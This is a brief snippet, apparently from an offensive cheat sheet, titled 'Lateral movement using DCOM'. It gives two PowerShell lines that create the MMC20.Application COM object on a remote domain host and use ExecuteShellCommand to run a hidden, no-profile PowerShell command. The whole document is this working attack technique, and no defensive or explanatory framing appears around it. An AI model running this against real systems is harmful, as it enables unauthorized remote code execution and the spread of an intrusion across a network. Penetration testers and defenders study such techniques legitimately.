### Lateral movement using DCOM
```
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "&lt;domain&gt;"))
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,'-NoP -W Hidden -Command "&lt;command&gt;"',$null)
```


